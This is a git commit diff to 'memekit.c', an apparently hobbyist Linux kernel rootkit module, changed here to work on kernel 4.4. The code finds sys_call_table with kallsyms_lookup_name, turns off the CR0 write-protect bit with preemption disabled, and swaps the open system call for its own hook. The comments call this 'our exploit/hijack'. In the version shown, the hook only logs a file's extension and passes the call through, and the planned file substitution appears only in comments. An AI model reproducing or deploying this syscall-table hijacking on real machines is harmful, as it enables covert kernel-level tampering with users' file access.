d053cc52c47b45a98d10ab6700a14a53e1c1db54
Jason Turley <jasonturley0@gmail.com>
2022-02-24 13:43:42 -0800

    edit code for kernel 4.4 - no longer get page fault

--- memekit.c
+++ memekit.c
@@ -34,6 +34,9 @@ static inline void overwrite_cr0(unsigned long val)
  * 
  * We need to disable it in order to overwrite to the system call table at
  * runtime.
+ *
+ * Preemption is disabled to prevent the CPU scheduler from offloading our
+ * task to another core while it is running.
  */
 static void disable_write_protected_bit(void)
 {
@@ -45,41 +48,14 @@ static void disable_write_protected_bit(void)
  * Enables the Write Protected (read only) bit in the control register, cr0.
  *
  * We need to reenable it after our exploit/hijack is complete.
+ *
+ * Also turn preemption back on for the CPU scheduler.
  */
 static void enable_write_protected_bit(void)
 {
 	overwrite_cr0(read_cr0() | 0x10000);
 	preempt_enable();
 }
-
-int set_addr_rw(unsigned long addr)
-{
-	unsigned int level;
-	pte_t *pte = lookup_address(addr, &level);
-
-	if (pte == NULL)
-		return -1;
-
-	if (pte->pte &~ _PAGE_RW) 
-		pte->pte |= _PAGE_RW;
-
-	return 0;
-}
-
-int set_addr_ro(unsigned long addr)
-{
-	unsigned int level;
-	pte_t *pte = lookup_address(addr, &level);
-
-	if (pte == NULL) {
-		return -1;
-	}
-
-	pte->pte = pte->pte &~_PAGE_RW;
-
-	return 0;
-}
-
 
 /* Save a copy of the original open system call */
 asmlinkage int (*original_open)(const char *pathname, int flags, mode_t mode);
@@ -97,12 +73,12 @@ asmlinkage int meme_open(const char *pathname, int flags, mode_t mode)
 
 	extension = pathname + len - 4;
 
-	printk(KERN_DEBUG "extension = %s\n", extension);
+	printk(KERN_DEBUG  "extension = %s\n", extension);
 
 	// if so, open our memefile instead
 		// otherwise, open the non-PNG file
 	*/
-	printk(KERN_DEBUG "memekit: inside meme_open\n");
+	printk(KERN_DEBUG  "memekit: inside meme_open\n");
 	return original_open(pathname, flags, mode);
 }
 
@@ -115,44 +91,36 @@ static int __init memekit_init(void)
 
 	printk(KERN_DEBUG "memekit: module loaded!\n");
 
-	/* Get address of sys_call_table */
-
 	sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");
-
-	if (sys_call_table != NULL) {
-		printk(KERN_DEBUG "memekit: found sys_call_table at address %lx\n", (unsigned long)sys_call_table);
-	} else {
-		printk(KERN_ERR "memekit: failed to find sys_call_table, aborting now\n");
-		return -1;	/* do not load */
-	}
-
-	if (set_addr_rw((unsigned long) sys_call_table)) {
-		printk(KERN_ERR "memekit: set_addr_rw failed for address %lx\n", (unsigned long) sys_call_table);
+	
+	if (sys_call_table == NULL) {
+		printk(KERN_ERR "memekit: failed to find sys_call_table. Exiting\n");
 		return -1;
 	}
 
-	/* Disable write protect so we can overwrite the syscall table */
-	disable_write_protected_bit();
+	printk(KERN_DEBUG "memekit: found sys_call_table at address %lx\n", (unsigned long)sys_call_table);
 
+    /* Disable write protect so we can overwrite the syscall table */
+	disable_write_protected_bit();
+	
 	/* Hijack the legit open system call with our meme open function */
 	original_open = (int(*)(const char *, int, mode_t))sys_call_table[__NR_open]; 
 	sys_call_table[__NR_open] = (void *) meme_open;
+	
+	printk(KERN_DEBUG "memekit: original_open at address %lx\n", (unsigned long)original_open);
 
 	return 0;
 }
 
 static void __exit memekit_exit(void)
 {
+	/* Restore the original open system call */
 	sys_call_table[__NR_open] = (void *) original_open;
 
-	if (set_addr_ro((unsigned long) sys_call_table)) {
-		printk(KERN_ERR "memekit: set_addr_ro failed for address %lx\n", (unsigned long) sys_call_table);
-	}
-
-	/* Reenable the write protect bit */
+	/* Re-enable the write protect bit */
 	enable_write_protected_bit();
 
-	printk(KERN_DEBUG "memekit: unloaded!\n");
+	printk(KERN_DEBUG  "memekit: module unloaded!\n");
 }
 
 module_init(memekit_init);
